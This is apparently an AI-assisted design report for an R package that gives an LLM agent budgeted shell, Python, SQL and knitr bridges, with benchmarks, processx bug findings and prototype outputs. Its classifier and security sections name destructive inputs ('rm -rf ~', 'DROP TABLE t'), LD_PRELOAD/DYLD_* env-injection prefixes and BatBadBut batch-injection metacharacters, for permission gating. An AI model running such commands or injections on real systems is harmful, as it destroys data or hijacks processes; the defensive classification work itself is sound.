# G5 — R as token-efficient polyglot glue

> Materialised by the lead designer from the gap researcher's structured output and the
> verified prototype files it left in scratch (the subagent could not write this file itself).
> Code is embedded verbatim below so the repository is self-contained. Prototype code may use
> `<-`; convert to the house style (`=`, `|>`) when copying into the package (S-9).

## 1. Summary

G5: R as token-efficient polyglot glue (REQ-03/09/10/41/42; S-4, S-9, S-11, S-12; D-03, D-11, D-28). Everything ran on macOS arm64, R 4.4.3, Rscript --vanilla in the C locale. Package versions: processx 3.8.6 (key findings re-checked on CRAN 3.9.0), reticulate 1.46.0, DBI 1.3.0, RSQLite 2.4.6, duckdb 1.5.0, knitr 1.51, rtiktoken 0.0.7 (o200k_base). No Windows or Linux host; no paid calls.

DESIGN

1. Placement. Polyglot work runs inside the single R execution tool through bridges reached as members of the gateway.
- gptr is a function with class c("gptr_gateway", "function") plus S3 methods $, [[, .DollarNames and print.
- No new exports and no model-visible shell tool.
- Every bridge registers through the same extension API that plugins use (S-11).

2. API (all "=" style).
- gptr$sh(cmd, input = NULL, wd = ".", timeout = getOption("gptr.sh_timeout", 120), env = NULL, shell = NULL, merge = FALSE, check = FALSE, echo = NULL, max_tokens = NULL). cmd is either an argv vector (no shell, portable) or one command line. A simple command line (no shell syntax, program found by Sys.which, not a batch file) runs directly; anything else runs with the resolved shell. Returns gptr_cmd with $stdout/$stderr (lazily decoded lines), $status, $ok, and print = budgeted view.
- gptr$script(path, args, ..., interpreter = NULL): runs by extension or shebang through an interpreter registry.
- gptr$bg(cmd, ..., stdin = FALSE, merge = TRUE, name = NULL) returns a gptr_job environment with $read(), $wait(timeout, until = regex), $write(text), $kill(), $status().
- gptr$jobs(kill = FALSE).
- gptr$out(id): one of the last 20 results, whose ids appear in truncation notices.
- gptr$py(code, name = obj, python = NULL, max_rows = 10): persistent reticulate __main__, shared with knitr {python} chunks. The last expression's repr is shown with pandas display bounded; errors are one line; $value converts to R.
- gptr$sql(query, name = df, con = NULL, n = 10, max_rows = 1e5, envir = parent.frame()): data frames are queried in an in-memory duckdb by zero-copy registration; otherwise the single DBIConnection in scope is used. Prints dims plus n rows; the value holds all rows.
- gptr$knit(engine, code): bash/sh/zsh, python and sql route to the native bridges; the other knitr engines (52 in total) go through knitr with its 'running:' message suppressed.
- Exported user-facing functions: gptr_bridge(name, fun, classify, record, prompt, available, replace), gptr_interpreter(ext, candidates, args, windows_only), gptr_shell(), gptr_classify().
- Options: gptr.shell, gptr.sh_timeout = 120, gptr.output_tokens = 1500, gptr.supervise, gptr.max_jobs = 8, gptr.spill_keep = 50, gptr.py_managed = FALSE, gptr.native_chunks = c("python", "sql").

3. Engine. processx::process$new with stdout/stderr redirected to temp files, and gptr decodes UTF-8 itself.
- processx::run() is not used: its make_buffer() uses cat(), which corrupts non-ASCII output in a C locale (3.8.6 and 3.9.0), and its interrupt handler calls invokeRestart("abort").
- All argv, working-directory and env strings pass through os_bytes() (unmarked UTF-8).
- The wait loop is p$wait(200) with a hard timeout and on.exit(kill_all).
- kill_all = kill_tree(), then on Windows taskkill /F /T /PID while the parent is still alive, then $kill() (which signals the process group).
- Child environment = session environment minus secrets loaded by gptr_env(), plus NO_COLOR, TERM=dumb, PAGER=cat, GIT_PAGER=cat, GIT_TERMINAL_PROMPT=0, PYTHONIOENCODING=utf-8, PYTHONUNBUFFERED=1.
- stdin is the null device unless input = is given (a temp file; data frames are written as CSV).

4. Output view shown to the model.
- stdout: head 40% plus tail 60%. Budget = max_tokens x 0.85, converted to bytes using a fitted token density.
- A '[stderr]' section gets at most 25% of the budget; unused stderr budget goes to stdout.
- Status lines: '[exit N]' or '[timed out after Ns; process tree killed]'.
- Truncation notice: '[... n lines omitted (total, size); all: gptr$out(id)$stdout]' (30 tokens, against 69 with a temp path).
- Lines are capped at 400 characters; ANSI/OSC sequences are stripped; carriage-return progress is collapsed; binary output is detected.
- echo streams to the user's console (R's stderr), which the model-facing sink does not capture.

5. Permissions.
- gptr_classify runs report 18's R classifier plus per-bridge argument classifiers and takes the maximum level: a command table (levels 0-4, compound commands split, wrappers stripped, redirects and path classes), SQL leading keywords, and a Python token scan.
- Literal system()/system2()/processx::run calls get the same command classifier.
- Computed arguments are level 3 and are re-checked at run time via gptr_permit().
- Rule grammar additions: r(sh:git status*), r(sql:select), r(py:*), r(knit:perl).
- Mode table: read-only calls are allowed in every mode; edits mode auto-approves file commands inside the workspace (Claude acceptEdits parity); level 4 still asks in auto.

6. History document (report 14).
- Helper calls are recorded verbatim as R.
- Each call emits a bridge_call event; its digest becomes a '#>' line, e.g. '#> sh git status --porcelain: exit 0, 6 lines', '#> py: Series 2', '#> sql: 3 rows x 2 cols'.
- Level-0 executions that bind nothing default to record = FALSE.
- In Rmd/qmd, a single literal py or sql call becomes a native {python} or {sql, connection=x} chunk. Bash stays as gptr$sh by default, because knitr's bash engine assumes bash and has no timeout.

7. Model prompt. A <polyglot> section of 297 tokens, cacheable, with lines gated by available(). Pi's bash tool schema plus snippet costs 125.

8. Shell tool. An opt-in model-visible shell tool is NOT compatible with S-4 as a built-in. It is allowed only as an off-by-default plugin adapter that runs gptr$sh() through the r tool's pipeline. Remove 'shell' from D-03's on-request list; map Bash in foreign agent files to r.

9. Naming. Use gptr$<name> on the gateway. It also resolves report 06's tools$ naming question: tools$ clashes with the base package name.
- Fallback: exports gptr_sh/gptr_py/gptr_sql/gptr_script/gptr_bg/gptr_jobs/gptr_knit/gptr_out (all free on CRAN).
- Collision scan found py (reticulate), sql (dbplyr, dplyr), run (38 CRAN packages incl. processx, callr, rmarkdown), knit (knitr), exec (rlang, purrr), bash (devtools) and tool (ellmer) taken.
- Per-call token difference between spellings is 1 or less.

10. Dependencies. No new Imports (processx, jsonlite and rlang are already proposed). Suggests: reticulate, DBI, duckdb, RSQLite, knitr. rtiktoken is dev-only.

TOKEN TABLE (o200k_base; tool-call argument JSON + result text; framing and model prose not counted)

Variants: A = bash tool with Pi semantics; A2 = frugal bash; B = the same command through gptr$sh; C = R-composed.

| Task | A | A2 | B | C | Calls A/A2/B/C |
|---|---:|---:|---:|---:|---|
| T1 git status+diff | 4417 | 89 | 1311 | 934 | |
| T2 shell script (402 lines) | 8105 | - | 1141 | 100 | |
| T3 rg, 588 matches | 12390 | 132 | 1196 | 196 | |
| T4 pandas pivot | 299 | - | 381 | 51 | |
| T5 SQL, 3 steps | 6476 | - | 383 | 175 | 3/-/3/1 |
| T6 download + inspect | 174 | - | 180 | 169 | |
| T7 make (302 lines + 2 warnings) | 7268 | 100 | 1543 | 113 | |
| T8 long job (241 lines) | 6011 | 204 | 1457 | 229 | 1/3/1/1 |
| TOTAL | 45140 | 525 (4 tasks) | 7592 | 1967 | round trips A 10, B 10, C 8 |

- A to B is 5.9x fewer tokens; A to C is 22.9x fewer.
- Frugal bash matches C on pure text filtering.
- R's advantages: default budgets that hold without model frugality, results kept as objects, cross-language data without passing through the context, and fewer round trips.
- Where outputs are small (T4, T6), B costs 3-6% more. In T4 that is because gptr shows all 12 pandas columns, where pandas' default print hides 4.

WINDOWS NOTES (static; nothing run on Windows)
- argv form and the fast path need no shell.
- String commands use Git Bash (%ProgramFiles%, ProgramW6432, (x86), %LOCALAPPDATA%\Programs; never System32\bash.exe), then PowerShell, then cmd.
- PowerShell: -NoProfile -NonInteractive -ExecutionPolicy Bypass -EncodedCommand base64(UTF-16LE), with a UTF-8 OutputEncoding prefix and a postfix that preserves $LASTEXITCODE (docs: -Command maps other exit codes to 1).
- cmd: /d /s /c "chcp 65001 >nul & ..." with windows_verbatim_args = TRUE.
- Batch shims run as cmd /d /c call <shim> args, refusing % ^ & | < > " ! CR LF in the args (BatBadBut CVE-2024-24576, CVE-2024-27980); .cmd/.bat scripts get the same check.
- Decode UTF-8, else fall back to CP<l10n_info()$system.codepage>.
- Skip WindowsApps python stubs (exit 9009); prefer py -3.
- Large inputs go on stdin, never argv (32,767-character command-line limit).

SECURITY NOTES
- No sandbox; classification is advisory.
- The argv form never involves a shell; computed commands are gated at run time; batch shims refuse metacharacters.
- Env-injection prefixes (LD_PRELOAD, DYLD_*, PATH=) should be level 3 (proposal).
- Secrets are removed from child envs; env/printenv/echo $*_KEY are level 2; helper output goes through redact() (D-22).
- Hangs are prevented by the null-device stdin and GIT_TERMINAL_PROMPT=0.
- Network use is classified; reticulate's uv provisioning is blocked by default.
- Jobs are supervised and capped; every child is killed with kill_all.
- Spill files stay only in tempdir() and are pruned.

## 2. Key findings

- **[VERIFIED]** In a C locale, processx::run(encoding = "UTF-8") corrupts non-ASCII child output: 'cafe-acute CJK' comes back as truncated escape text 'caf<U+00E9'. The cause is processx:::make_buffer(), which accumulates with cat() and then readChar(useBytes = TRUE) with a UTF-8 byte count. The bug is present in 3.8.6 and in CRAN 3.9.0. The default encoding "" drops non-ASCII bytes. process$new(encoding = "UTF-8") with read_all_output(), and file capture decoded by readBin, are both correct.
  - Evidence: executed: scratchpad/work/G5/p02_encoding.R -> 'run(encoding=UTF-8) bytes=[63 61 66 3c 55 2b 30 30 45 39]' (C locale), correct in en_US.UTF-8; same with processx 3.9.0 in lib390; source: processx 3.9.0 tarball R/utils.R:313-327 (make_buffer push = cat(text, file = con)), deparsed 3.8.6 run()
- **[VERIFIED]** processx translates UTF-8-marked argv strings to the native encoding, so in a C locale the child receives 'caf<U+00E9>'. The same bytes left unmarked arrive intact, so gptr must strip encoding marks (os_bytes) on argv, wd and env.
  - Evidence: executed: p04c_killtree.R last line 'UTF-8-marked arg in C locale -> child bytes: 63 61 66 3c 55 2b 30 30 45 39 3e 0a'; p04_sh.R test 'UTF-8-marked argument reaches the child as UTF-8 bytes' PASS after os_bytes()
- **[VERIFIED]** On this macOS, ps::ps_environ() returns 0 variables for SIP-protected /bin binaries, so process$kill_tree() killed nothing for '/bin/bash -c "sleep 30 & sleep 31; wait"' (not even the direct child). A /bin/sleep grandchild of python survived kill_tree. $kill() signals the process group and cleans up. tools::pskill(-pid) returns FALSE. A setsid grandchild escapes both. The kill_tree result reproduced on processx 3.9.0. The robust recipe is kill_tree(), then taskkill /T (Windows) while the parent is alive, then kill().
  - Evidence: executed: p04d_killtree2.R ('/bin/bash ... environ readable (0 vars) kill_tree killed 0 pid(s); child alive after: TRUE'), p04e_kill.R (p$kill(): no leftovers; pskill(-pid) FALSE; setsid leftover); processx ?process: kill() 'also terminate all of its child processes, except if they have created a new process group'; kill_tree 'works by marking the process with an environment variable'
- **[VERIFIED]** processx::run() handles an interrupt by killing only the direct child, signalling a condition of class c('system_command_interrupt','interrupt'), and then calling invokeRestart('abort'), which bypasses report 18's pause menu when uncaught. A custom p$wait(200) loop with on.exit(kill_all(p)) kills the whole tree on Ctrl-C and lets the interrupt propagate.
  - Evidence: deparsed processx 3.8.6 run(); processx 3.9.0 R/run.R:346-380; executed p05_bg_interrupt.R: SIGINT to a child R running gptr$sh('sleep 37 & sleep 38; wait') -> 'child R saw: INTERRUPTED', PASS no sleep left
- **[VERIFIED]** Output of system()/system2() without capture, and a child's stderr, go straight to the process file descriptors and are not captured by sink(), so the model never sees it (report 12's gap). Helpers print through R and are captured. echo = TRUE streams to R's stderr, so the user saw 300 progress lines while the model-facing sink got a 21-line budgeted view.
  - Evidence: executed: p01_probes.R section (c) (only 'R cat() line' and system2(stdout=TRUE) captured); p13_echo.R ('model saw 21 lines'; stderr file had 300 progress lines)
- **[VERIFIED]** Report 18's static classifier labels gptr$sh("rm -rf ~"), gptr$py(...) and gptr$sql("DROP TABLE t") as level 0 read-only, and system2("git","status") as level 3, because it does not inspect helper arguments. The G5 bridge classifiers (command table, SQL keywords, Python token scan, literal system/system2/processx::run) meet 46/46 expectation cases at 1.3-3.8 ms per call.
  - Evidence: executed: classify_r_code() from scratchpad/work/18/b1_classifier.R on the six calls; p08_classify.R final output '46 / 46 expectations met', 'classification cost: 1.84 ms per call'
- **[VERIFIED]** Measured token cost over 8 real tasks (o200k_base): a Pi-semantics bash tool used 45,140 tokens; the same commands through gptr$sh used 7,592 (5.9x fewer); R-composed calls used 1,967 (22.9x fewer), with 8 round trips instead of 10. Frugal bash (head/tail/sort pipes) is comparable to R composition on pure text filtering (525 tokens against 1,472 on the 4 tasks where both exist). R wins through default budgets, results kept as objects, cross-language data that never enters the context, and fewer round trips (T5 and T8: 1 call against 3).
  - Evidence: executed: p10_tokens.R final output table and totals 'A 45140 | B 7592 | C 1967 tokens ; round trips A 10, B 10, C 8'
- **[VERIFIED]** chars/4 underestimates bash-tool output tokens by 22% here (3.12 bytes per o200k token; 1.5-4.2 across tasks). A per-byte-class linear estimator (0.137*letters + 0.805*digits + 0.092*spaces + 0.663*punct + 1.718*lines + 0.333*non-ASCII bytes) has median error about 0% and p95 absolute error 15-28% on held-out chunks, against 47-53% for chars/4. With a 0.85 safety factor, budgeted views land within 2% of a 1,500-token budget.
  - Evidence: executed: p11_calibrate.R split-half fit ('test half ... fitted median -0.0% p95|err| 19.2%'), p10_tokens.R calibration lines; before the fit, one view printed 2,403 tokens against a 1,500 budget
- **[VERIFIED]** Without an explicit Python configuration, reticulate's order of discovery ends (step 14) in a uv-provisioned ephemeral environment, which means downloads. gptr$py must refuse unless RETICULATE_PYTHON, VIRTUAL_ENV or python = is set, or the user opts in.
  - Evidence: reticulate 1.46.0 installed docs: versions.Rmd 'Order of Discovery' items 1-15; ?py_require 'Reticulate uses uv to resolve Python dependencies'
- **[VERIFIED]** gptr$py keeps one persistent __main__ shared with knitr's {python} engine. It shows the last expression REPL-style with a bounded pandas repr, captures stdout, stderr and warnings, and reports one-line errors. Handing an R object to Python made R's next in-place edit copy it in 4 of 6 variants, so copy-free handoff cannot be promised (conflict 18).
  - Evidence: executed: p06_py.R (6/6 PASS incl. 'knitr python chunk sees objects created by gptr$py'); p06b_sticky.R table of copy outcomes
- **[VERIFIED]** gptr$sql finds the single DBIConnection in scope by touching only class() (lazy and active bindings skipped). It errors when there are several, prints dims plus 10 rows while returning all rows, and queries a 2e6-row data frame through duckdb registration in 0.17-0.26 s without copying the column (address unchanged).
  - Evidence: executed: p07_sql_knit.R ('found: shop', 'several connections in scope (other, shop); pass con =', PASS column vector not copied by registration)
- **[VERIFIED]** Name collisions on CRAN (25,106 packages via the r-universe exports search, plus 612 local NAMESPACE files): py (reticulate), sql (dbplyr, dplyr), run (38 packages incl. processx, callr, rmarkdown), knit (knitr), exec (rlang, purrr), bash (devtools), tool (ellmer). All gptr_* names are free. Spellings differ by 1 token or less per call.
  - Evidence: executed: p03_collisions.R output table; p14_names.out (sh 5, gptr_sh 7, gptr$sh 8, tools$sh 7 tokens)
- **[VERIFIED]** An exported function that carries an S3 class with $ / [[ / .DollarNames methods (gateway as helper namespace) passes R CMD check --as-cran; the only NOTEs came from toy metadata. pkg::gw$sh() works without attaching the package.
  - Evidence: executed: toy/gwtoy R CMD check log ('S3 generic/method consistency ... OK', 'R code for possible problems ... OK', 'examples ... OK', 3 toy NOTEs); R_LIBS=./lib Rscript -e 'gwtoy::gw$sh(...)' -> 'attached? FALSE'
- **[VERIFIED]** PowerShell -EncodedCommand takes base64 of UTF-16LE and is meant for commands with complex nested quoting. Under -Command, a native program's exit code other than 0/1 becomes 1 unless the command ends with 'exit $LASTEXITCODE'. cmd /s strips only the outer quotes and /d disables AutoRun. processx documents running batch files through 'cmd.exe /c call'.
  - Evidence: https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_pwsh ; https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/cmd ; processx ?process 'Batch files' section
- **[VERIFIED]** BatBadBut argument injection through batch files is CVE-2024-24576 (Rust std, CVSS 10) and CVE-2024-27980 (Node child_process; the fix refuses .bat/.cmd without shell:true). The Windows Store python3.exe alias stub exits 9009 and is found by Sys.which.
  - Evidence: web search results (thehackernews, opencve, wiz, nodejs.org July 2024 security release); bugs.python.org issue41327 and several project issues
- **[UNCERTAIN]** The Windows runtime behaviour of the designed shell argv (PowerShell -EncodedCommand with exit-code postfix, cmd /d /s /c with windows_verbatim_args, taskkill ordering, OEM code page output) was not executed.
  - Evidence: no Windows host; only static argv construction was checked on macOS (the shell_argv() output shown in the session)
- **[LIKELY]** Git for Windows per-user installs land in %LOCALAPPDATA%\Programs\Git\bin\bash.exe.
  - Evidence: secondary sources only (pi issue #9963, opencdss.state.co.us Git install lesson)

## 3. Design implications

- Add no model-visible shell tool. Polyglot work runs from the r tool through bridges reached as gateway members: gptr$sh, gptr$script, gptr$bg, gptr$jobs, gptr$py, gptr$sql, gptr$knit, gptr$out. gptr is a classed closure (c('gptr_gateway','function')) with $, [[, .DollarNames and print methods. Use the same object as report 06's tools-as-R-functions dispatcher (gptr$read, gptr$mcp__server__tool) instead of tools$.
- Register every bridge with gptr_bridge(name, fun, classify, record, prompt, available, replace = FALSE) on the public extension registry (S-11). Register interpreters with gptr_interpreter(ext, candidates, args, windows_only). Built-ins use the same calls, so third parties can add Julia, Stata, SAS or ssh bridges and command-risk entries.
- Build the engine on processx::process$new with stdout/stderr redirected to files. Never use processx::run() (C-locale corruption; abort restart). Pass all argv, wd and env strings through os_bytes(). Decode output as UTF-8, falling back to the Windows system code page. Use a p$wait(200) loop with a hard timeout and on.exit(kill_all(p)).
- Kill process trees with kill_tree(), then on Windows taskkill /F /T /PID while the parent is alive, then $kill() (process group). Correct reports 13 and 15, which rely on kill_tree() alone.
- Report to the model only by printing a budgeted head+tail view, 1,500 tokens by default (gptr.output_tokens) with a 0.85 safety factor. stderr goes in its own section (at most 25% of the budget) plus '[exit N]'. The truncation notice gives a short handle 'all: gptr$out(id)$stdout'. Clean ANSI codes and carriage-return progress; stream echo to the user's stderr only. The r tool should pass its remaining budget so that helper defaults take min(option, 0.6 x remaining).
- Size budgets with the fitted per-byte-class token estimator (six coefficients shipped in R; refit by a dev script), not chars/4. Session accounting still uses provider-reported usage.
- Extend gptr_classify (report 18): delegate gptr$<bridge> calls to per-bridge argument classifiers; run literal system/system2/processx::run calls through the command classifier; treat computed commands as level 3 and re-check them at run time with gptr_permit(); append a hint when system()/system2() output is uncaptured. Add rule specs r(sh:<words>*), r(sql:<keywords>), r(py:*), r(knit:<engine>). In edits mode, auto-approve file commands inside the workspace.
- Emit a bridge_call event per helper call ({bridge, id, cmd/code redacted, level, status, seconds, bytes_out, bytes_err, spill, digest}). The history writer turns digests into '#>' lines; hooks can observe or block via pre_bridge; token accounting records bytes produced versus bytes shown.
- History document: record helper calls verbatim as R. Default record = FALSE for level-0 executions that bind nothing. In Rmd/qmd, turn a single literal gptr$py / gptr$sql(con = sym) call into a native {python} / {sql, connection=sym} chunk (knitr shares reticulate's __main__). Keep shell calls as gptr$sh by default.
- Python: guard against reticulate's uv-managed provisioning unless configured or options(gptr.py_managed = TRUE). Use the REPL-style last value with bounded pandas display. Document that passing large objects may cause one copy at the next R modification.
- SQL: query data frames through duckdb registration (no copy) when con is NULL and frames are named; otherwise use the single DBIConnection in scope, found with class()-only access. Print dims plus n rows; return all rows as the value.
- Background jobs are env-backed S3 objects writing to files (no pipe polling or blocking). Supervise them per gptr.supervise (FALSE in examples, because supervisor fifos are fatal in CRAN examples), cap them with gptr.max_jobs, and kill them at session end, in .onUnload and by finalizer. A foreground timeout kills the process and suggests gptr$bg; it does not move the command to the background.
- D-03: remove 'shell (off by default)' from the on-request tool list. An optional plugin adapter may expose shell{command, timeout} that executes gptr$sh() through the r tool pipeline. Map Bash in .claude/.codex agent definitions to r (not shell).
- D-20: no new Imports (processx, jsonlite, rlang are already proposed). Suggests: reticulate, DBI, duckdb, RSQLite, knitr. rtiktoken is dev/bench only. CRAN tests and examples use file.path(R.home('bin'), 'Rscript') as the portable child program.
- Add the 8-task polyglot benchmark (p10_tokens.R fixtures) to dev/bench/polyglot for the REQ-42 token-efficiency suite, with a 10% regression rule on the B and C totals.

## 4. Risks

- The command/SQL/Python classifiers are heuristic. Unknown programs default to level 3, which may cause prompt fatigue in manual mode. Scripts and Makefile recipes can do anything. Classification is not a security boundary.
- The kill recipe is verified only on macOS. Windows relies on docs (taskkill ordering, job objects), and setsid grandchildren escape on every platform.
- The token estimator was fitted on an ASCII corpus of about 100k o200k tokens. Claude and Gemini tokenizers may differ, and non-English output is overestimated (+70% on a CJK probe), which errs toward printing less.
- Variant C token savings assume the model composes in R as the prompt asks; frugal bash achieves similar numbers on text filtering. This needs live-model validation (no paid calls were made).
- Handing objects to Python via reticulate can make R's next in-place edit copy a multi-GB object once; the behaviour is path-dependent and inconsistent across runs.
- The fast path (running simple command strings without a shell) differs from shell semantics for aliases, shell functions and builtins that shadow PATH programs (echo -e/-n).
- reticulate binds one Python per R session. The first gptr$py() fixes the interpreter, and a later request for another one fails.
- Every Windows behaviour of the designed argv construction (PowerShell -EncodedCommand plus the exit-code postfix, cmd /d /s /c with windows_verbatim_args, OEM code-page output of console programs, Git Bash discovery) is unexecuted.
- Background jobs survive a hard R crash unless supervised, but supervision leaves fifo connections, which are forbidden in CRAN examples.
- The report file could not be written by this subagent (the harness blocked it); downstream agents must rely on this structured output and the scratch artifacts, which live in a temporary directory.

## 5. Open questions

- Will the architecture accept the classed-closure gateway namespace (gptr$sh, also as report 06's dispatcher)? The fallback is exported gptr_sh/gptr_py/... plus gptr_call('name', ...) for plugin bridges.
- Default foreground timeout: 120 s (Claude) or none (Pi)? Should a timeout kill the process (this proposal) or move it to the background (Claude)?
- Default helper print budget: 1,500 tokens (this proposal) or around 10k (Codex)? This needs live-model measurement of how often models re-query.
- Should edits mode auto-approve workspace-internal file commands (cp, mv, touch, redirects), matching Claude's acceptEdits?
- Should shell calls in Rmd/qmd history documents become native {bash} chunks by default, given that knitr's bash engine assumes bash and has no timeout?
- Should echo go to R's stderr (shown in red in RStudio) or be routed through report 18's gptr_ui layer?
- Windows CI must verify: PowerShell -EncodedCommand and exit codes, cmd /d /s /c with windows_verbatim_args, the taskkill ordering, the BatBadBut refusal, py -3 and WindowsApps stub detection, and OEM code-page decoding.
- Should an env-injection prefix (LD_PRELOAD=, DYLD_*=, PATH=) be classified level 3? The prototype strips assignments without flagging them.
- Should a persistent non-reticulate Python bridge (a REPL over pipes) be a built-in fallback or only a plugin example?
- Who writes dev/research/G5-polyglot-glue-helpers.md, given that this subagent was blocked from writing report files?

## 6. Prototype files (208 files from `scratchpad/work/G5/`)

### `assemble.py`

````text
#!/usr/bin/env python3
# Assemble the G5 report: replace @@CODE path@@ / @@OUT path@@ / @@TEXT path@@ lines in the
# template with the verbatim file contents (fenced), so embedded code and outputs are exactly
# what ran.
import os, re, sys

HERE = os.path.dirname(os.path.abspath(__file__))
src = os.path.join(HERE, "report_template.md")
dst = sys.argv[1]

def fence(body, lang):
    ticks = "```"
    while ticks in body:
        ticks += "`"
    if not body.endswith("\n"):
        body += "\n"
    return f"{ticks}{lang}\n{body}{ticks}\n"

out = []
for line in open(src, encoding="utf-8").read().splitlines(keepends=True):
    m = re.match(r"^@@(CODE|OUT|TEXT)\s+(\S+)(?:\s+(\S+))?@@\s*$", line)
    if not m:
        out.append(line)
        continue
    kind, path, lang = m.group(1), m.group(2), m.group(3)
    full = os.path.join(HERE, path)
    body = open(full, "rb").read().decode("utf-8", errors="replace")
    if kind == "CODE":
        out.append(fence(body, lang or "r"))
    elif kind == "OUT":
        out.append(fence(body, "text"))
    else:
        out.append(fence(body, lang or "text"))
open(dst, "w", encoding="utf-8").write("".join(out))
print("wrote", dst, os.path.getsize(dst), "bytes")
````

### `bench/build.sh`

````sh
#!/bin/sh
echo '== configure'
i=1; while [ $i -le 400 ]; do echo "[step $i/400] processing chunk_$i.parquet ... ok ($((i*3)) rows/s)"; i=$((i+1)); done
echo 'WARNING: 3 chunks had missing timestamps' 1>&2
echo '== done: 400 chunks, 1,203,300 rows, output in out/'
````

### `bench/long.py`

````text
import time
for i in range(1, 241):
    print(f'[{i:3d}/240] epoch {i // 20 + 1} batch {i % 20:2d} loss={2.0 / (1 + i / 40):.4f} lr=3e-4', flush=True)
    time.sleep(0.025)
print('DONE best_loss=0.2857 checkpoint=ckpt/best.pt', flush=True)
````

### `bench/repo/NOTES.md`

````text
notes
````

### `final/_log.txt`

````text
=== p01_probes 22:47:54
    exit 0
=== p02_encoding 22:47:55
    exit 0
=== p04d_killtree2 22:47:56
    exit 0
=== p04e_kill 22:48:03
    exit 0
=== p04_sh 22:48:10
    exit 0
=== p05_bg_interrupt 22:48:14
    exit 0
=== p06_py 22:48:22
    exit 0
=== p06b_sticky 22:48:25
    exit 0
=== p07_sql_knit 22:48:27
    exit 0
=== p08_classify 22:48:29
    exit 0
=== p09_history 22:48:29
    exit 0
=== p12_declarations 22:48:32
    exit 0
=== p13_echo 22:48:33
    exit 0
=== p03_collisions 22:48:35
    exit 0
=== p10_tokens 22:48:45
    exit 0
=== p11_calibrate 22:49:36
    exit 0
=== done 22:51:31
````

### `final/p01_probes.out`

````text
== (a) S3 `$` dispatch on a classed closure (gateway doubles as namespace) ==
call     : prompt: hello 
dollar   : helper sh(git status) 
brackets : helper py(x = 1) 
is.function: TRUE  class: gw_gateway/function 
completion : sh,sql 
args()     : function (...)  

== (b) processx::run defaults ==
run() formals: command, args, error_on_status, wd, echo_cmd, echo, spinner, timeout, stdout, stderr, stdout_line_callback, stdout_callback, stderr_line_callback, stderr_callback, stderr_to_stdout, env, windows_verbatim_args, windows_hide_window, encoding, cleanup_tree, ... 
default stdin: NULL  default encoding: "" 
cat with default stdin: status=0 timeout=FALSE stdout="" elapsed=0.01s
sleep 10, timeout 1: status=-9 timeout=TRUE elapsed=1.01s
locale: C 
default encoding bytes: 63 61 66 20 0a  Encoding: unknown 
UTF-8 encoding bytes  : 63 61 66 3c 55 2b 30 30 45 39  Encoding: unknown 

== (c) sink() capture gap for child processes ==
from system
from system2 default stdout
captured by sink:
  | R cat() line
  | [1] "from system2 stdout=TRUE"
(lines 'from system', 'from system2 default stdout' and 'to-stderr' went to the process fds, not the sink)
````

### `final/p02_encoding.out`

````text
locale: C  l10n UTF-8: FALSE 
run(encoding='UTF-8')$stdout           bytes=[63 61 66 3c 55 2b 30 30 45 39] enc=unknown nchar=10
run(encoding='')$stdout                bytes=[63 61 66 20 0a] enc=unknown nchar=5
process$new(encoding='UTF-8') read_all bytes=[63 61 66 c3 a9 20 e4 b8 ad 0a] enc=UTF-8 nchar=7
process$new(encoding='') read_all      bytes=[63 61 66 20 0a] enc=unknown nchar=5
stdout=<file>, readBin + mark UTF-8    bytes=[63 61 66 c3 a9 20 e4 b8 ad 0a] enc=UTF-8 nchar=7
validUTF8: TRUE 
  after strsplit                       bytes=[63 61 66 c3 a9 20 e4 b8 ad] enc=UTF-8 nchar=6
  after paste0                         bytes=[63 61 66 c3 a9 20 e4 b8 ad 20 21] enc=UTF-8 nchar=8
  jsonlite: "caf<U+00E9> <U+4E2D>" 
````

### `final/p02_encoding_UTF8.out`

````text
locale: en_US.UTF-8  l10n UTF-8: TRUE 
run(encoding='UTF-8')$stdout           bytes=[63 61 66 c3 a9 20 e4 b8 ad 0a] enc=unknown nchar=7
run(encoding='')$stdout                bytes=[63 61 66 c3 a9 20 e4 b8 ad 0a] enc=unknown nchar=7
process$new(encoding='UTF-8') read_all bytes=[63 61 66 c3 a9 20 e4 b8 ad 0a] enc=UTF-8 nchar=7
process$new(encoding='') read_all      bytes=[63 61 66 c3 a9 20 e4 b8 ad 0a] enc=UTF-8 nchar=7
stdout=<file>, readBin + mark UTF-8    bytes=[63 61 66 c3 a9 20 e4 b8 ad 0a] enc=UTF-8 nchar=7
validUTF8: TRUE 
  after strsplit                       bytes=[63 61 66 c3 a9 20 e4 b8 ad] enc=UTF-8 nchar=6
  after paste0                         bytes=[63 61 66 c3 a9 20 e4 b8 ad 20 21] enc=UTF-8 nchar=8
  jsonlite: "café 中" 
````

### `final/p03_collisions.out`

````text
CRAN packages in index: 25106 
installed packages scanned: 612 

 name        query                universe_total cran_n cran_examples                                    local                                              
 sh          _exports sh           2              2     seewave,shapes                                                                                      
 py          _exports py           5              4     organizr,reticulate,rpyANTs,rpymat               reticulate                                         
 sql         _exports sql          8              4     civis,dbplyr,dplyr,wizaRdry                      dbplyr,dplyr                                       
 run         _exports run         60             38     AMAPVox,IxPopDyMod,Rapp,Recocrop,Rquefts,Rwofost callr,future,languageserver,processx,renv,rmarkdown
 shell       _exports shell       NA              0                                                                                                         
 bg          _exports bg           4              2     AFR,flextable                                                                                       
 jobs        _exports jobs         4              4     TMDb,doRedis,openrouteservice,tmdbR                                                                 
 job         _exports job          1              1     job                                                                                                 
 script      _exports script       3              2     html5,script                                                                                        
 knit        _exports knit         2              1     knitr                                            knitr                                              
 cmd         _exports cmd          2              2     ClimInd,MESS                                                                                        
 exec        _exports exec         6              3     purrr,rlang,yulab.utils                          decoupleR,purrr,rlang,yulab.utils                  
 run_cmd     _exports run_cmd      1              1     bsub                                                                                                
 sys         _exports sys          2              2     Hmisc,SampleSelectR                                                                                 
 bash        _exports bash         3              1     devtools                                         devtools                                           
 python      _exports python       1              0                                                                                                         
 gptr        _exports gptr        NA              0                                                                                                         
 gptr_sh     _exports gptr_sh     NA              0                                                                                                         
 gptr_py     _exports gptr_py     NA              0                                                                                                         
 gptr_sql    _exports gptr_sql    NA              0                                                                                                         
 gptr_run    _exports gptr_run    NA              0                                                                                                         
 gptr_script _exports gptr_script NA              0                                                                                                         
 gptr_bg     _exports gptr_bg     NA              0                                                                                                         
 gptr_knit   _exports gptr_knit   NA              0                                                                                                         
 tools       _exports tools        1              1     eppoFindeR                                                                                          
 tool        _exports tool         4              4     aisdk,ellmer,epiworldR,mcplite                   ellmer                                             
 g           _exports g           10              9     Aoptbdtvc,CSTE,GECal,Opt5PL,cgaim,ibd                                                               
 gp          _exports gp          14             11     GPBayes,RiskMap,brms,cccp,dgpsi,gitr                                                                
